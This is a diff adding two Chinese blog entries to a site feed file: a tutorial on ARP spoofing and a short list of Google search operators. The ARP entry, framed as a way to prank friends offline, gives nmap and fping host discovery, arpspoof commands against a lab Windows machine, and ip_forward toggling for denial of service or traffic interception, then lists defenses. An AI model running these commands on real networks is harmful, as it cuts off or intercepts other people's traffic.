@@ -4,6 +4,44 @@
   
   
   <entry>
+    <title>断网法术之ARP欺骗</title>
+    <link href="/2024/05/27/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/"/>
+    <url>/2024/05/27/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/</url>
+    
+    <content type="html"><![CDATA[<p>想整蛊你的死党朋友让上不了网，黑魔法ARP攻击满足你</p><span id="more"></span><h3 id="1-1-ARP协议"><a href="#1-1-ARP协议" class="headerlink" title="1.1 ARP协议"></a>1.1 ARP协议</h3><p>先了解一下什么是ARP攻击</p><p>在局域网中，网络中实际传输的是“帧”，帧里面是有目标主机的MAC地址的。在以太网中，一个主机要和另一个主机进行直接通信，必须要知道目标主机的MAC地址。MAC地址就是ARP协议获得的。其实就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。所以说从某种意义上讲ARP协议是工作在更低于IP协议的协议层。这也是为什么ARP欺骗更能够让人在神不知鬼不觉的情况下出现网络故障，危害会很隐蔽。</p><h3 id="2-1-ARP欺骗原理"><a href="#2-1-ARP欺骗原理" class="headerlink" title="2.1 ARP欺骗原理"></a>2.1 ARP欺骗原理</h3><p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><p>当局域网中一台机器，反复向其他机器，特别是向网关，发送这样无效假冒的ARP应答信息包时，严重的网络堵塞就会开始。由于网关MAC地址错误，所以从网络中计算机发来的数据无法正常发到网关，自然无法正常上网。这就造成了无法访问外网的问题，由于很多时候网关还控制着我们的局域网LAN上网，所以这时我们的LAN访问也就出现问题了。</p><p>3.1 断网攻击</p><p>3.1.1 寻找局域网内存活主机</p><p>测试信息</p><p>攻击机：kaliip：192.168.184.128</p><p>靶机：win10ip：192.168.184.130</p><p>nmap扫描</p><p><code>nmap -sP 192.168.184.*</code></p><p><img src="/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/1716813756191.png" alt="nmap扫描"></p><p>fping探测</p><p><code>fping -g 192.168.184.0/24</code></p><p>3.1.2 查看当前网关</p><p><code>cat etc/resolv.conf</code></p><p><img src="/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/1716813818992.png" alt="查看当前网关"></p><p>3.1.3 发起攻击</p><p>使用arpspoof工具</p><p><code>arpspoof   -i   网卡   -t    目标IP    网关</code></p><p><code>arpspoof -i eth0 -t 192.168.184.130 192.168.184.2</code></p><p><img src="/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/1716813805503.png" alt="发动攻击"></p><p>攻击开始后，win10靶机就断网了</p><p><img src="/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/1716813961484.png" alt="ping百度测试"></p><p>ctrl+Z终止攻击</p><p>补充一点：</p><p>刚方法适用于在同一局域网的目标，如果两台主机同时连接的校园网是大概率不行的，大部分校园网都做了ip隔断，无线用户之间互相隔离</p><h3 id="3-2-ARP欺骗（不断网）"><a href="#3-2-ARP欺骗（不断网）" class="headerlink" title="3.2 ARP欺骗（不断网）"></a>3.2 ARP欺骗（不断网）</h3><p>ARP欺骗攻击是冒充网关向目标主机发送假的ARP数据包。</p><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><ol><li>获取目标主机的流量</li><li>获取流量之后进行转发</li></ol><p>相当于一个中间人，可以在中途拦截一下流量，这样所有的流量都会被监控</p><p><strong>开启转发功能</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/sys/net/ipv4/ip_forward<br>echo 1 &gt; /proc/sys/net/ipv4/ip_forward（转发）<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">echo</span> 代表写入</span><br>这样可以实现流量转发，而不是截断流量<br>如果要截断流量，写入0即可<br><span class="hljs-meta prompt_">#</span><span class="language-bash">截断流量</span><br>echo 0 &gt;/proc/sys/net/ipv4/ip_forward（断网）<br></code></pre></td></tr></table></figure><p><strong>发起攻击</strong></p><p><code>arpspoof -i eth0 -t 192.168.186.2 192.168.186.131</code>   </p><p>注意这次是网关在前，目标ip在后</p><p><strong>结果</strong></p><p>经过测试后发现，访问http网站时可以拦截流量，而https则不行</p><p>https加密传输，安全性还是挺好的</p><p><strong>这里稍微补充一下HTTP和HTTPS</strong></p><p>1.HTTP是一种发布和接收HTML页面的方法，被用于在Wb浏览器和网站服务器之间传递信息。<br>2.HTTP协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Wb浏览器和<br>网站服务器之间的传输报文，就可以直接读懂其中的信息。<br>3.HTTPS经由HTTP进行通信，但利用SSL&#x2F;TLS来加密数据包。HTTPS开发的主要目的，是提<br>供对网站服务器的身份认证，保护交换数据的隐私与完整性。<br>4.HTTPS(SSL+HTTP)数据传输过程是加密的，安全性较好。</p><h3 id="4-1-如何防御ARP欺骗"><a href="#4-1-如何防御ARP欺骗" class="headerlink" title="4.1 如何防御ARP欺骗"></a>4.1 如何防御ARP欺骗</h3><p><strong>ARP 高速缓存超时设置</strong><br>在ARP高速缓存中的表项一般都要设置超时值，缩短这个这个超时值能够有用的避免ARP表的溢出。</p><p><strong>静态ARP缓存表</strong><br>每台主机都有一个暂时寄存IP-MAC的对应表ARP攻击就经过更改这个缓存来到达诈骗的意图，运用静态的ARP来绑定正确的MAC是一个有用的办法，在命令行下运用arp -a能够检查当<strong>时的ARP缓存表。</strong></p><p>自动查询<br>在某个正常的时间，做一个IP和MAC对应的数据库，以后定时检查当时的IP和MAC对应联系是否正常，定时检查交流机的流量列表，检查丢包率。</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>实践应用</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>google hacking</title>
+    <link href="/2024/05/20/google%20hacking/"/>
+    <url>/2024/05/20/google%20hacking/</url>
+    
+    <content type="html"><![CDATA[<span id="more"></span><p>intext: xxx</p><p>搜索出现在正文中的内容</p><p>intitle: xxx</p><p>搜索出现在标题中的内容</p><p>inurl: xxx</p><p>搜索在url中出现的内容</p><p>filetype:<br>搜索指定类型的文件.例如输入:filetype:asp.将返回所有以asp结尾的文件的URL，可以与其他操作符混合使用</p><p>info:<br>搜索输入URL的摘要信息和其他相关信息，该操作符不能与其他操作符及关键字混用</p><p>持续更新…</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>技术基础</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>资产搜集</title>
     <link href="/2024/05/20/%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86/"/>
     <url>/2024/05/20/%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86/</url>
